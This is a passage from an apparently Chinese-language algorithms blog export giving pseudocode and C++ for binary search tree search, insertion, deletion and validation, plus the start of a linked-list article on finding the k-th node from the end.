&#123;</span><br><span class="line">                    cout &lt;&lt; z-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">                    y = z;</span><br><span class="line">                    S.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">postorder2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;ONode&gt;&gt; S;</span><br><span class="line">        S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, root));</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;o == ONode::T) &#123;</span><br><span class="line">                S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::V, x-&gt;b));</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;R)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;R));</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;L)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;L));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; x-&gt;b-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ONode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">Operate</span> &#123;T, V&#125;;</span><br><span class="line">        <span class="built_in">ONode</span>(Operate o, shared_ptr&lt;BNode&gt; b) : <span class="built_in">o</span>(o), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Operate o;</span><br><span class="line">        shared_ptr&lt;BNode&gt; b;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div></div></div></div></div></div></div>

<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><p>1960年由<code>P.F. Windley</code>、<code>A.D. Booth</code>、<code>A.J.T. Colin</code>和<code>T.N. Hibbard</code>共同发明。<br>二叉搜索树（<code>BST，binary search tree</code>）应用于<a href="/Algorithm/Sort#%E6%A0%91%E6%8E%92%E5%BA%8F"><strong>树排序</strong></a>和<strong>二分搜索</strong>算法，也是集合类<strong>set</strong>和<strong>map</strong>的实现基础。</p>
<ul>
<li>性质<ol>
<li>是一种有根二叉树；</li>
<li>每个节点的值，大于其左子树的所有值，小于其右子树的所有值。</li>
</ol>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Algorithm</th>
<th align="left">Average</th>
<th align="left">Worst</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Space</td>
<td align="left">$n$</td>
<td align="left">$n$</td>
</tr>
<tr>
<td align="left">Search</td>
<td align="left">$\log n$</td>
<td align="left">$n$</td>
</tr>
<tr>
<td align="left">Insert</td>
<td align="left">$\log n$</td>
<td align="left">$n$</td>
</tr>
<tr>
<td align="left">Delete</td>
<td align="left">$\log n$</td>
<td align="left">$n$</td>
</tr>
</tbody></table>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a><strong>搜索</strong></h2><p>从二叉搜索树<code>T</code>的根节点开始，向下搜索直至找到目标节点。</p>
<div class="tabs" id="searchbst"><ul class="nav-tabs"><li class="tab active"><a href="#searchbst-1">pseudo</a></li><li class="tab"><a href="#searchbst-2">c++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="searchbst-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 搜索（递归）</span></span><br><span class="line">    Search(x, e)</span><br><span class="line">        <span class="keyword">if</span> x.NotExist or x.e = e</span><br><span class="line">            Print(x)</span><br><span class="line">        <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">            Search(x.L, e)</span><br><span class="line">        <span class="keyword">if</span> x.e &lt; e</span><br><span class="line">            Search(x.R, e)</span><br><span class="line">    <span class="comment"># 搜索（迭代）</span></span><br><span class="line">    Search(e)</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.e = e</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x.R</span><br><span class="line">        Print(x)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="searchbst-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BSNode</span>(<span class="type">int</span> e, shared_ptr&lt;BSNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BSNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="title">search</span><span class="params">(shared_ptr&lt;BSNode&gt; x, <span class="type">int</span> e)</span> -&gt; <span class="title">decltype</span><span class="params">(x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!x || x-&gt;e == e)</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;e &gt; e)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">search</span>(x-&gt;L, e);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">search</span>(x-&gt;R, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="title">search</span><span class="params">(<span class="type">int</span> e)</span> -&gt; shared_ptr&lt;BSNode&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> x = root;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;e == e)</span><br><span class="line">                <span class="keyword">return</span> x;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;e &gt; e)</span><br><span class="line">                x = x-&gt;L;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x-&gt;R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BSNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a><strong>插入</strong></h2><p>从二叉搜索树<code>T</code>的根节点开始，向下搜索直至到达一个叶节点，将新节点添加为叶节点的子节点。</p>
<div class="tabs" id="insertbst"><ul class="nav-tabs"><li class="tab active"><a href="#insertbst-1">pseudo</a></li><li class="tab"><a href="#insertbst-2">c++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="insertbst-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 插入（递归）</span></span><br><span class="line">    Insert(x, e)</span><br><span class="line">        <span class="keyword">if</span> x.NotExist</span><br><span class="line">            x = BSNode &#123;e, nul, nul&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">            Insert(x.L, e)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            Insert(x.R, e)</span><br><span class="line">    <span class="comment"># 插入（迭代）</span></span><br><span class="line">    Insert(e)</span><br><span class="line">        z: BSNode &#123;e, nul, nul&#125;</span><br><span class="line">        y: BSNode, =nul</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x.R</span><br><span class="line">        <span class="keyword">if</span> y.NotExist</span><br><span class="line">            root = z</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> y.e &gt; e</span><br><span class="line">            y.L = z</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            y.R = z</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="insertbst-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BSNode</span>(<span class="type">int</span> e, shared_ptr&lt;BSNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BSNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(shared_ptr&lt;BSNode&gt;&amp; x, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!x) &#123;</span><br><span class="line">            x = <span class="built_in">make_shared</span>&lt;BSNode&gt;(e);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;e &gt; e) &#123;</span><br><span class="line">            <span class="built_in">insert</span>(x-&gt;L, e);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">insert</span>(x-&gt;R, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> z = <span class="built_in">make_shared</span>&lt;BSNode&gt;(e);</span><br><span class="line">        <span class="keyword">decltype</span>(z) y = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">decltype</span>(z) x = root;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            y = x;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;e &gt; e)</span><br><span class="line">                x = x-&gt;L;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x-&gt;R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!y) &#123;</span><br><span class="line">            root = z;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (y-&gt;e &gt; e) &#123;</span><br><span class="line">            y-&gt;L = z;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            y-&gt;R = z;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BSNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a><strong>删除</strong></h2><p>从二叉搜索树<code>T</code>中删除一个节点<code>z</code>后，必须保证<code>T</code>仍为二叉搜索树。<br>1962年<code>T. Hibbard</code>提出一种删除策略，保证子树的高度最多变化<code>1</code>：</p>
<ol>
<li><code>z</code>没有子树时：移除<code>z</code>节点；</li>
<li><code>z</code>有一个子树（<code>L或R, L&lt;z&lt;R</code>）时：子树取代<code>z</code>节点；</li>
<li><code>z</code>有两个子树（<code>L和R, L&lt;z&lt;R</code>）时：在子树<code>R</code>中寻找最小节点<code>y</code>取代<code>z</code>节点，而<code>y</code>节点的右子树取代<code>y</code>节点，</li>
</ol>
<div class="tabs" id="deletebst"><ul class="nav-tabs"><li class="tab active"><a href="#deletebst-1">pseudo</a></li><li class="tab"><a href="#deletebst-2">c++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="deletebst-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 删除（递归）</span></span><br><span class="line">    <span class="comment"># p: 当前父节点</span></span><br><span class="line">    <span class="comment"># x: 当前节点</span></span><br><span class="line">    <span class="comment"># e: 目标节点的值</span></span><br><span class="line">    Delete(p, x, e)</span><br><span class="line">        <span class="comment"># 寻找e值所在的z节点</span></span><br><span class="line">        <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">            Delete(x, x.L, e)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> x.e &lt; e</span><br><span class="line">            Delete(x, x.R, e)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        z: BSNode, =x</span><br><span class="line">        <span class="comment"># z有两个子树时</span></span><br><span class="line">        <span class="keyword">if</span> z.L.Exist and z.R.Exist</span><br><span class="line">            q,y: BSNode, y=min(z.R), q=parent(y)</span><br><span class="line">            z.e = y.e</span><br><span class="line">            Delete(q, y, y.e)</span><br><span class="line">        <span class="comment"># z有一个子树时</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> z.L.Exist</span><br><span class="line">            p.Child(z) = z.L</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> x.R.Exist</span><br><span class="line">            p.Child(z) = z.R</span><br><span class="line">        <span class="comment"># z没有子树时</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p.Child(z) = nul</span><br><span class="line">    <span class="comment"># 删除（迭代）</span></span><br><span class="line">    Delete(e)</span><br><span class="line">        <span class="comment"># 寻找e值所在的z节点</span></span><br><span class="line">        z: BSNode, =nul</span><br><span class="line">        p: BSNode, =nul</span><br><span class="line">        x: BSNode, =root</span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.e = e</span><br><span class="line">                z = x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            p = x</span><br><span class="line">            <span class="keyword">if</span> x.e &gt; e</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x.R</span><br><span class="line">        <span class="comment"># z有两个子树时</span></span><br><span class="line">        <span class="keyword">if</span> z.L.Exist and z.R.Exist</span><br><span class="line">            q,y: BSNode, y=min(z.R), q=parent(y)</span><br><span class="line">            z.e = y.e</span><br><span class="line">            q.Child(y) = y.R</span><br><span class="line">        <span class="comment"># z有一个子树时</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> z.L.Exist</span><br><span class="line">            p.Child(z) = z.L</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> x.R.Exist</span><br><span class="line">            p.Child(z) = z.R</span><br><span class="line">        <span class="comment"># z没有子树时</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p.Child(z) = nul</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="deletebst-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BSNode</span>(<span class="type">int</span> e, shared_ptr&lt;BSNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BSNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(shared_ptr&lt;BSNode&gt; p, shared_ptr&lt;BSNode&gt; x, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;e &gt; e) &#123;</span><br><span class="line">            <span class="built_in">remove</span>(x, x-&gt;L, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;e &lt; e) &#123;</span><br><span class="line">            <span class="built_in">remove</span>(x, x-&gt;R, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">decltype</span>(x) z = x;</span><br><span class="line">        <span class="keyword">if</span> (z-&gt;L &amp;&amp; z-&gt;R) &#123;</span><br><span class="line">            <span class="keyword">decltype</span>(p) q = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">auto</span> y = <span class="built_in">findMin</span>(z-&gt;R, q);</span><br><span class="line">            z-&gt;e = y-&gt;e;</span><br><span class="line">            <span class="built_in">remove</span>(q, y, y-&gt;e);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (z-&gt;L) &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, z, z-&gt;L);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (z-&gt;R) &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, z, z-&gt;R);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, z, <span class="literal">nullptr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> x = root;</span><br><span class="line">        <span class="keyword">decltype</span>(x) p = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;e == e)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            p = x;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;e &gt; e)</span><br><span class="line">                x = x-&gt;L;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x-&gt;R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!x) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;L &amp;&amp; x-&gt;R) &#123;</span><br><span class="line">            <span class="keyword">decltype</span>(x) q = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">auto</span> y = <span class="built_in">findMin</span>(x-&gt;R, q);</span><br><span class="line">            x-&gt;e = y-&gt;e;</span><br><span class="line">            <span class="built_in">replaceChild</span>(q, y, y-&gt;R);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;L) &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, x, x-&gt;L);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;R) &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, x, x-&gt;R);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">replaceChild</span>(p, x, <span class="literal">nullptr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="title">findMin</span><span class="params">(shared_ptr&lt;BSNode&gt; x, shared_ptr&lt;BSNode&gt;&amp; p)</span> -&gt; <span class="title">decltype</span><span class="params">(x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">decltype</span>(x) z = x;</span><br><span class="line">        <span class="keyword">while</span> (z-&gt;L) &#123;</span><br><span class="line">            p = z;</span><br><span class="line">            z = z-&gt;L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> z;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">replaceChild</span><span class="params">(shared_ptr&lt;BSNode&gt; p, shared_ptr&lt;BSNode&gt; x, shared_ptr&lt;BSNode&gt; y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;L == x)</span><br><span class="line">            p-&gt;L = y;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;R == x)</span><br><span class="line">            p-&gt;R = y;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BSNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="遍历-1"><a href="#遍历-1" class="headerlink" title="遍历"></a><strong>遍历</strong></h2><p>以<a href="#%E4%BA%8C%E5%8F%89%E6%A0%91"><strong>中序遍历</strong></a>规则遍历二叉搜索树<code>T</code>，可以得到有序列表。（见<a href="#%E4%BA%8C%E5%8F%89%E6%A0%91"><strong>二叉树&#x2F;深度优先&#x2F;中序遍历</strong></a>过程）</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h2><p>校验<strong>二叉树</strong>是否为<strong>二叉搜索树</strong>。</p>
<div class="tabs" id="verificationbst"><ul class="nav-tabs"><li class="tab active"><a href="#verificationbst-1">Pseudo</a></li><li class="tab"><a href="#verificationbst-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="verificationbst-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BSNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BSTree</span><br><span class="line">    root: BSNode，=nul</span><br><span class="line">    <span class="comment"># 校验（递归）</span></span><br><span class="line">    <span class="comment"># x: root</span></span><br><span class="line">    <span class="comment"># p: INT_MIN</span></span><br><span class="line">    <span class="comment"># r: INT_MAX</span></span><br><span class="line">    IsBST(x, p, <span class="built_in">r</span>)</span><br><span class="line">        <span class="keyword">if</span> x.NotExist</span><br><span class="line">            <span class="keyword">return</span> true</span><br><span class="line">        <span class="keyword">if</span> p &gt; x.e or x.e &gt; <span class="built_in">r</span></span><br><span class="line">            <span class="keyword">return</span> false</span><br><span class="line">        <span class="keyword">return</span> IsBST(x.L, p, x.e) and IsBST(x.R, x.e, <span class="built_in">r</span>)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="verificationbst-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BSNode</span>(<span class="type">int</span> e, shared_ptr&lt;BSNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BSNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BSNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBST</span><span class="params">(shared_ptr&lt;BSNode&gt; x, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!x)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &gt; x-&gt;e || x-&gt;e &gt; r)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isBST</span>(x-&gt;L, p, x-&gt;e) &amp;&amp; <span class="built_in">isBST</span>(x-&gt;R, x-&gt;e, r);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BSNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div>

]]></content>
      <categories>
        <category>Algorithm</category>
        <category>DataStructure</category>
        <category>BinarySearchTree</category>
      </categories>
      <tags>
        <tag>BinarySearchTree</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表</title>
    <url>/DataStructure/LinkedList/SinglyLinkedList.html</url>
    <content><![CDATA[<p>单链表相关的算法。</p>
<span id="more"></span>

<h1 id="倒数第K个节点"><a href="#倒数第K个节点" class="headerlink" title="倒数第K个节点"></a>倒数第K个节点</h1><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p><a href="https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">leetcode 剑指 Offer 22: 链表中倒数第k个节点 （简单）</a></p>
<div class="tabs" id="getkthfromend"><ul class="nav-tabs"><li class="tab active"><a href="#getkthfromend-1">DoublePoint</a></li><li class="tab"><a href="#getkthfromend-2">Recursion</a></li></ul><div class="tab-content"><div class="tab-pane active" id="getkthfromend-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = head;</span><br><span class="line">    ListNode *slow = head;</span><br><span class="line">    <span class="comment">// 快指针先跑k次</span></span><br><span class="line">    <span class="keyword">while</span> (fast &amp;&amp; k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">        k--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 快慢指针同步跑到结尾</span></span><br><span class="line">    <span class="keyword">while</span> (fast) &#123;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 慢指针指向倒数第k个节点</span></span><br><span class="line">    <span class="keyword">return</span> 